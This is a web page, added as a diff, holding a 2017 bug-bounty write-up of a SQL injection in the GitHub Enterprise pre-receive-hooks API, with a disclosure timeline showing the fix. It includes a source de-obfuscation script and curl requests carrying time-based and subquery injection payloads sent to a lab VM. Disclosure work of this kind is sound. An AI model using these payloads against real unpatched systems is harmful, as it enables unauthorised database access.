@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="BeforeGitHub Enterprise is the on-premises version of GitHub.com that you can deploy a whole GitHub service in your private network for businesses. You can get 45-days free trial and download the VM">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GitHub Enterprise SQL Injection">
+<meta property="og:url" content="http://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/index.html">
+<meta property="og:site_name" content="Orange Tsai">
+<meta property="og:description" content="BeforeGitHub Enterprise is the on-premises version of GitHub.com that you can deploy a whole GitHub service in your private network for businesses. You can get 45-days free trial and download the VM">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/efb3e6ce144c9274-01.jpg">
+<meta property="og:image" content="http://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/a81df8f4402b419c-02.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/20609f2163e55ac6-03.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/482d7eb3053df05e-04.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/dd61f17b0587e12e-05.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/6f86f7b65cd3f212-06.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/4607e1c001b5dbbf-07.png">
+<meta property="article:published_time" content="2017-01-06T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-21T06:22:37.100Z">
+<meta property="article:author" content="Orange Tsai">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.orange.tw/posts/2017-01-bug-bounty-github-enterprise-sql-injection/efb3e6ce144c9274-01.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>GitHub Enterprise SQL Injection | Orange Tsai</title>
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Orange Tsai" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  <a class="u-url u-uid" href="/">
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <h1 class="p-name">Orange Tsai</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/articles/">Articles</a></li><!--
+   --><!--
+     --><li><a href="/talks/">Talks</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        GitHub Enterprise SQL Injection
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">🍊 <a href='/about'>Orange Tsai</a></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-01-06T16:00:00.000Z" class="dt-published" itemprop="datePublished">2017-01-07</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><img src="/posts/2017-01-bug-bounty-github-enterprise-sql-injection/efb3e6ce144c9274-01.jpg" alt="preview"></p>
+<h1 id="Before"><a href="#Before" class="headerlink" title="Before"></a>Before</h1><p>GitHub Enterprise is the on-premises version of <a target="_blank" rel="noopener" href="https://github.com/">GitHub.com</a> that you can deploy a whole GitHub service in your private network for businesses. You can get 45-days free trial and download the VM from <a target="_blank" rel="noopener" href="https://enterprise.github.com/">enterprise.github.com</a>.</p>
+<p>After you deployed, you will see like bellow:</p>
+<p><img src="/posts/2017-01-bug-bounty-github-enterprise-sql-injection/a81df8f4402b419c-02.png"></p>
+<p><img src="/posts/2017-01-bug-bounty-github-enterprise-sql-injection/20609f2163e55ac6-03.png"></p>
+<p>Now, I have all the GitHub environment in a VM. It’s interesting, so I decided to look deeper into VM :P</p>
+<h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>The beginning of everything is Port Scanning. After using our good friend - Nmap, we found that there are 6 exposed ports on VM.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sT -vv -p 1-65535 192.168.187.145</span><br><span class="line">...</span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">22/tcp   open   ssh</span><br><span class="line">25/tcp   closed smtp</span><br><span class="line">80/tcp   open   http</span><br><span class="line">122/tcp  open   smakynet</span><br><span class="line">443/tcp  open   https</span><br><span class="line">8080/tcp closed http-proxy</span><br><span class="line">8443/tcp open   https-alt</span><br><span class="line">9418/tcp open   git</span><br></pre></td></tr></table></figure>
+
+
+
+<p>With a little knocking and service grabbing, it seems like:</p>
+<ul>
+<li><code>22/tcp</code> and <code>9418/tcp</code> seem like <code>haproxy</code> and it forwards connections to a backend service called <code>babeld</code></li>
+<li><code>80/tcp</code> and <code>443/tcp</code> are the main GitHub services</li>
+<li><code>122/tcp</code> is just a SSH service</li>
+<li><code>8443/tcp</code> is management console of GitHub</li>
+</ul>
+<p>By the way, GitHub management console need a password to login. Once you got the password, you can add your SSH key and connect into VM through <code>122/tcp</code></p>
+<p>With SSH into VM, we examined the whole system and found that the service code base looks like under directory of <code>/data/</code></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ ls -al /data/</span><br><span class="line">total 92</span><br><span class="line">drwxr-xr-x 23 root              root              4096 Nov 29 12:54 .</span><br><span class="line">drwxr-xr-x 27 root              root              4096 Dec 28 19:18 ..</span><br><span class="line">drwxr-xr-x  4 git               git               4096 Nov 29 12:54 alambic</span><br><span class="line">drwxr-xr-x  4 babeld            babeld            4096 Nov 29 12:53 babeld</span><br><span class="line">drwxr-xr-x  4 git               git               4096 Nov 29 12:54 codeload</span><br><span class="line">drwxr-xr-x  2 root              root              4096 Nov 29 12:54 db</span><br><span class="line">drwxr-xr-x  2 root              root              4096 Nov 29 12:52 enterprise</span><br><span class="line">drwxr-xr-x  4 enterprise-manage enterprise-manage 4096 Nov 29 12:53 enterprise-manage</span><br><span class="line">drwxr-xr-x  4 git               git               4096 Nov 29 12:54 failbotd</span><br><span class="line">drwxr-xr-x  3 root              root              4096 Nov 29 12:54 git-hooks</span><br><span class="line">drwxr-xr-x  4 git               git               4096 Nov 29 12:53 github</span><br><span class="line">drwxr-xr-x  4 git               git               4096 Nov 29 12:54 git-import</span><br><span class="line">drwxr-xr-x  4 git               git               4096 Nov 29 12:54 gitmon</span><br><span class="line">drwxr-xr-x  4 git               git               4096 Nov 29 12:54 gpgverify</span><br><span class="line">drwxr-xr-x  4 git               git               4096 Nov 29 12:54 hookshot</span><br><span class="line">drwxr-xr-x  4 root              root              4096 Nov 29 12:54 lariat</span><br><span class="line">drwxr-xr-x  4 root              root              4096 Nov 29 12:54 longpoll</span><br><span class="line">drwxr-xr-x  4 git               git               4096 Nov 29 12:54 mail-replies</span><br><span class="line">drwxr-xr-x  4 git               git               4096 Nov 29 12:54 pages</span><br><span class="line">drwxr-xr-x  4 root              root              4096 Nov 29 12:54 pages-lua</span><br><span class="line">drwxr-xr-x  4 git               git               4096 Nov 29 12:54 render</span><br><span class="line">lrwxrwxrwx  1 root              root                23 Nov 29 12:52 repositories -&gt; /data/user/repositories</span><br><span class="line">drwxr-xr-x  4 git               git               4096 Nov 29 12:54 slumlord</span><br><span class="line">drwxr-xr-x 20 root              root              4096 Dec 28 19:22 user</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Change directory to <code>/data/</code> and try to review the source code, but it seems encrypted :(</p>
+<p><img src="/posts/2017-01-bug-bounty-github-enterprise-sql-injection/482d7eb3053df05e-04.png"></p>
+<p>GitHub uses a custom library to obfuscate their source code. If you search <code>ruby_concealer.so</code> on Google, you will find a kind man write a snippet on <a target="_blank" rel="noopener" href="https://gist.github.com/geoff-codes/02d1e45912253e9ac183">this gist</a>.</p>
+<p>It simply replace <code>rb_f_eval</code> to <code>rb_f_puts</code>in <code>ruby_concealer.so</code> and it’s work.</p>
+<p>But to be a hacker. We can’t just use it without knowing how it works. So, let’s open IDA Pro!</p>
+<p><img src="/posts/2017-01-bug-bounty-github-enterprise-sql-injection/dd61f17b0587e12e-05.png"></p>
+<p><img src="/posts/2017-01-bug-bounty-github-enterprise-sql-injection/6f86f7b65cd3f212-06.png"></p>
+<p>As you can see. It just uses <code>Zlib::Inflate::inflate</code> to decompress data and XOR with following key:</p>
+<blockquote>
+<p>This obfuscation is intended to discourage GitHub Enterprise customers from making modifications to the VM. We know this ‘encryption’ is easily broken. </p>
+</blockquote>
+<p>So we can easily implement it by our-self!</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;zlib&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">s</span>)</span><br><span class="line">    key = <span class="string">&quot;This obfuscation is intended to discourage GitHub Enterprise customers from making modifications to the VM. We know this &#x27;encryption&#x27; is easily broken. &quot;</span></span><br><span class="line">    i, plaintext = <span class="number">0</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="title class_">Zlib</span><span class="symbol">:</span><span class="symbol">:Inflate</span>.inflate(s).each_byte <span class="keyword">do</span> |<span class="params">c</span>|</span><br><span class="line">        plaintext &lt;&lt; (c ^ key[i%key.length].ord).chr</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    plaintext</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">content = <span class="title class_">File</span>.open(<span class="variable constant_">ARGV</span>[<span class="number">0</span>], <span class="string">&quot;r&quot;</span>).read</span><br><span class="line">content.sub! <span class="string">%Q(require &quot;ruby_concealer.so&quot;\n__ruby_concealer__)</span>, <span class="string">&quot; decrypt &quot;</span></span><br><span class="line">plaintext = eval content</span><br><span class="line"></span><br><span class="line">puts plaintext</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+<h1 id="Code-Analysis"><a href="#Code-Analysis" class="headerlink" title="Code Analysis"></a>Code Analysis</h1><p>After de-obfuscated all the code. Finally, we can start our code reviewing process.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">cloc /data/</span></span><br><span class="line">   81267 text files.</span><br><span class="line">   47503 unique files.</span><br><span class="line">   24550 files ignored.</span><br><span class="line"></span><br><span class="line">http://cloc.sourceforge.net v 1.60  T=348.06 s (103.5 files/s, 15548.9 lines/s)</span><br><span class="line">-----------------------------------------------------------------------------------</span><br><span class="line">Language                         files          blank        comment           code</span><br><span class="line">-----------------------------------------------------------------------------------</span><br><span class="line">Ruby                             25854         359545         437125        1838503</span><br><span class="line">Javascript                        4351         109994         105296         881416</span><br><span class="line">YAML                               600           1349           3214         289039</span><br><span class="line">Python                            1108          44862          64025         180400</span><br><span class="line">XML                                121           6492           3223         125556</span><br><span class="line">C                                  444          30903          23966         123938</span><br><span class="line">Bourne Shell                       852          14490          16417          87477</span><br><span class="line">HTML                               636          24760           2001          82526</span><br><span class="line">C++                                184           8370           8890          79139</span><br><span class="line">C/C++ Header                       428          11679          22773          72226</span><br><span class="line">Java                               198           6665          14303          45187</span><br><span class="line">CSS                                458           4641           3092          44813</span><br><span class="line">Bourne Again Shell                 142           6196           9006          35106</span><br><span class="line">m4                                  21           3259            369          29433</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ ./bin/rake about</span><br><span class="line">About your application&#x27;s environment</span><br><span class="line">Ruby version              2.1.7 (x86_64-linux)</span><br><span class="line">RubyGems version          2.2.5</span><br><span class="line">Rack version              1.6.4</span><br><span class="line">Rails version             3.2.22.4</span><br><span class="line">JavaScript Runtime        Node.js (V8)</span><br><span class="line">Active Record version     3.2.22.4</span><br><span class="line">Action Pack version       3.2.22.4</span><br><span class="line">Action Mailer version     3.2.22.4</span><br><span class="line">Active Support version    3.2.22.4</span><br><span class="line">Middleware                GitHub::DefaultRoleMiddleware, Rack::Runtime, Rack::MethodOverride, ActionDispatch::RequestId, Rails::Rack::Logger, ActionDispatch::ShowExceptions, ActionDispatch::DebugExceptions, ActionDispatch::Callbacks, ActiveRecord::ConnectionAdapters::ConnectionManagement, ActionDispatch::Cookies, ActionDispatch::Session::CookieStore, ActionDispatch::Flash, ActionDispatch::ParamsParser, ActionDispatch::Head, Rack::ConditionalGet, Rack::ETag, ActionDispatch::BestStandardsSupport</span><br><span class="line">Application root          /data/github/9fcdcc8</span><br><span class="line">Environment               production</span><br><span class="line">Database adapter          githubmysql2</span><br><span class="line">Database schema version   20161003225024</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Most of the code are written in Ruby (Ruby on Rails and Sinatra).</p>
+<ul>
+<li><code>/data/github/</code> looks like the application run under port <code>80/tcp</code> <code>443/tcp</code> and it looks like the real code base of <code>github.com</code>, <code>gist.github.com</code> and <code>api.github.com</code></li>
+<li><code>/data/render/</code> looks like real code base of <code>render.githubusercontent.com</code></li>
+<li><code>/data/enterprise-manage/</code> seems like the application run under port <code>8443/tcp</code></li>
+</ul>
+<p>GitHub Enterprise uses <code>enterprise?</code> and <code>dotcom?</code> to check whether the application is running under <strong>Enterprise Mode</strong> or <strong>GitHub dot com mode</strong>.</p>
+<h1 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h1><p>I use about one week to find this vulnerability, I am not familiar with Ruby. But just learning from doing :P</p>
+<p>This is my rough schedule of the week.</p>
+<ul>
+<li>Day 1 - Setting VM</li>
+<li>Day 2 - Setting VM</li>
+<li>Day 3 - Learning Rails by code reviewing</li>
+<li>Day 4 - Learning Rails by code reviewing</li>
+<li>Day 5 - Learning Rails by code reviewing</li>
+<li>Day 6 - Yeah, I found a SQL Injection!</li>
+</ul>
+<p>That SQL Injection vulnerability is found under GitHub Enterprise <code>PreReceiveHookTarget</code> model.</p>
+<p>The root cause is in <code>/data/github/current/app/model/pre_receive_hook_target.rb</code> line 45</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">33</span>   scope <span class="symbol">:sorted_by</span>, -&gt; (order, direction = <span class="literal">nil</span>) &#123;</span><br><span class="line"><span class="number">34</span>     direction = <span class="string">&quot;DESC&quot;</span> == <span class="string">&quot;<span class="subst">#&#123;direction&#125;</span>&quot;</span>.upcase ? <span class="string">&quot;DESC&quot;</span> : <span class="string">&quot;ASC&quot;</span></span><br><span class="line"><span class="number">35</span>     select(&lt;&lt;-<span class="variable constant_">SQL</span>)</span><br><span class="line"><span class="number">36</span>       <span class="comment">#&#123;table_name&#125;.*,</span></span><br><span class="line"><span class="number">37</span>       <span class="variable constant_">CASE</span> hookable_type</span><br><span class="line"><span class="number">38</span>         <span class="variable constant_">WHEN</span> <span class="string">&#x27;global&#x27;</span>     <span class="variable constant_">THEN</span> <span class="number">0</span></span><br><span class="line"><span class="number">39</span>         <span class="variable constant_">WHEN</span> <span class="string">&#x27;User&#x27;</span>       <span class="variable constant_">THEN</span> <span class="number">1</span></span><br><span class="line"><span class="number">40</span>         <span class="variable constant_">WHEN</span> <span class="string">&#x27;Repository&#x27;</span> <span class="variable constant_">THEN</span> <span class="number">2</span></span><br><span class="line"><span class="number">41</span>       <span class="variable constant_">END</span> <span class="variable constant_">AS</span> priority</span><br><span class="line"><span class="number">42</span>     <span class="variable constant_">SQL</span></span><br><span class="line"><span class="number">43</span>       .joins(<span class="string">&quot;JOIN pre_receive_hooks hook ON hook_id = hook.id&quot;</span>)</span><br><span class="line"><span class="number">44</span>       .readonly(<span class="literal">false</span>)</span><br><span class="line"><span class="number">45</span>       .order([order, direction].join(<span class="string">&quot; &quot;</span>))</span><br><span class="line"><span class="number">46</span>   &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Although There is built-in ORM(called <code>ActiveRecord</code> in Rails) in Rails and prevent you from SQL Injection. But there are so many <strong>misuse</strong> of <code>ActiveRecord</code> may cause SQL Injection. </p>
+<p>More examples you can check <a target="_blank" rel="noopener" href="http://rails-sqli.org/">Rails-sqli.org</a>. It’s good to learn about SQL Injection on Rails.</p>
+<p>In this case, if we can control the parameter of method <code>order</code> we can inject our malicious payload into SQL. </p>
+<p>OK, let’s trace up! <code>sorted_by</code> is called by <code>/data/github/current/app/api/org_pre_receive_hooks.rb</code> in line 61. </p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span>   get <span class="string">&quot;/organizations/:organization_id/pre-receive-hooks&quot;</span> <span class="keyword">do</span></span><br><span class="line"><span class="number">11</span>     control_access <span class="symbol">:list_org_pre_receive_hooks</span>, <span class="symbol">:org</span> =&gt; org = find_org!</span><br><span class="line"><span class="number">12</span>     <span class="variable">@documentation_url</span> &lt;&lt; <span class="string">&quot;#list-pre-receive-hooks&quot;</span></span><br><span class="line"><span class="number">13</span>     targets = <span class="title class_">PreReceiveHookTarget</span>.visible_for_hookable(org)</span><br><span class="line"><span class="number">14</span>     targets = sort(targets).paginate(pagination)</span><br><span class="line"><span class="number">15</span>     <span class="title class_">GitHub</span><span class="symbol">:</span><span class="symbol">:PrefillAssociations</span>.for_pre_receive_hook_targets targets</span><br><span class="line"><span class="number">16</span>     deliver <span class="symbol">:pre_receive_org_target_hash</span>, targets</span><br><span class="line"><span class="number">17</span>   <span class="keyword">end</span></span><br><span class="line">...</span><br><span class="line"><span class="number">60</span>   <span class="keyword">def</span> <span class="title function_">sort</span>(<span class="params">scope</span>)</span><br><span class="line"><span class="number">61</span>     scope.sorted_by(<span class="string">&quot;hook.<span class="subst">#&#123;params[<span class="symbol">:sort</span>] |<span class="params"></span>| <span class="string">&quot;id&quot;</span>&#125;</span>&quot;</span>, params[<span class="symbol">:direction</span>] |<span class="params"></span>| <span class="string">&quot;asc&quot;</span>)</span><br><span class="line"><span class="number">62</span>   <span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>You can see that <code>params[:sort]</code> is passed to <code>scope.sorted_by</code> . So, we can inject our malicious payload into <code>params[:sort]</code>.</p>
+<p>Before you trigger this vulnerability, you need a valid <code>access_token</code> with <code>admin:pre_receive_hook</code> scope to access API. Fortunately, it can be obtained by following command:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ curl -k -u <span class="string">&#x27;nogg:nogg&#x27;</span> <span class="string">&#x27;https://192.168.187.145/api/v3/authorizations&#x27;</span> \</span><br><span class="line">-d <span class="string">&#x27;&#123;&quot;scopes&quot;:&quot;admin:pre_receive_hook&quot;,&quot;note&quot;:&quot;x&quot;&#125;&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: 4,</span><br><span class="line">  <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://192.168.187.145/api/v3/authorizations/4&quot;</span>,</span><br><span class="line">  <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://developer.github.com/enterprise/2.8/v3/oauth_authorizations/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;client_id&quot;</span>: <span class="string">&quot;00000000000000000000&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;token&quot;</span>: <span class="string">&quot;????????&quot;</span>,</span><br><span class="line">  <span class="string">&quot;hashed_token&quot;</span>: <span class="string">&quot;1135d1310cbe67ae931ff7ed8a09d7497d4cc008ac730f2f7f7856dc5d6b39f4&quot;</span>,</span><br><span class="line">  <span class="string">&quot;token_last_eight&quot;</span>: <span class="string">&quot;1fadac36&quot;</span>,</span><br><span class="line">  <span class="string">&quot;note&quot;</span>: <span class="string">&quot;x&quot;</span>,</span><br><span class="line">  <span class="string">&quot;note_url&quot;</span>: null,</span><br><span class="line">  <span class="string">&quot;created_at&quot;</span>: <span class="string">&quot;2017-01-05T22:17:32Z&quot;</span>,</span><br><span class="line">  <span class="string">&quot;updated_at&quot;</span>: <span class="string">&quot;2017-01-05T22:17:32Z&quot;</span>,</span><br><span class="line">  <span class="string">&quot;scopes&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;admin:pre_receive_hook&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;fingerprint&quot;</span>: null</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Once you get a <code>access_token</code>, you can trigger the vulnerability by:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ curl -k -H <span class="string">&#x27;Accept:application/vnd.github.eye-scream-preview&#x27;</span> \</span><br><span class="line"><span class="string">&#x27;https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&amp;sort=id,(select+1+from+information_schema.tables+limit+1,1)&#x27;</span></span><br><span class="line">[</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">$ curl -k -H <span class="string">&#x27;Accept:application/vnd.github.eye-scream-preview&#x27;</span> \</span><br><span class="line"><span class="string">&#x27;https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&amp;sort=id,(select+1+from+mysql.user+limit+1,1)&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Server Error&quot;</span>,</span><br><span class="line">  <span class="string">&quot;documentation_url&quot;</span>: <span class="string">&quot;https://developer.github.com/enterprise/2.8/v3/orgs/pre_receive_hooks&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ curl -k -H <span class="string">&#x27;Accept:application/vnd.github.eye-scream-preview&#x27;</span> \</span><br><span class="line"><span class="string">&#x27;https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&amp;sort=id,if(user()=&quot;github@localhost&quot;,sleep(5),user())</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    ...</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/posts/2017-01-bug-bounty-github-enterprise-sql-injection/4607e1c001b5dbbf-07.png"></p>
+<h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><ul>
+<li>2016&#x2F;12&#x2F;26 05:48 Report vulnerability to GitHub via HackerOne</li>
+<li>2016&#x2F;12&#x2F;26 08:39 GitHub response that have validated issue and are working on a fix.</li>
+<li>2016&#x2F;12&#x2F;26 15:48 Provide more vulneraiblity detail.</li>
+<li>2016&#x2F;12&#x2F;28 02:44 GitHub response that the fix will included with next release of GitHub Enterprise.</li>
+<li>2017&#x2F;01&#x2F;04 06:41 GitHub response that offer $5,000 USD reward.</li>
+<li>2017&#x2F;01&#x2F;05 02:37 Asked Is there anything I should concern about if I want to post a blog?</li>
+<li>2017&#x2F;01&#x2F;05 03:06 GitHub is very open mind and response that it’s OK!</li>
+<li>2017&#x2F;01&#x2F;05 07:06 GitHub Enterprise 2.8.5 released!</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2024
+    Orange Tsai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/talks/">Talks</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
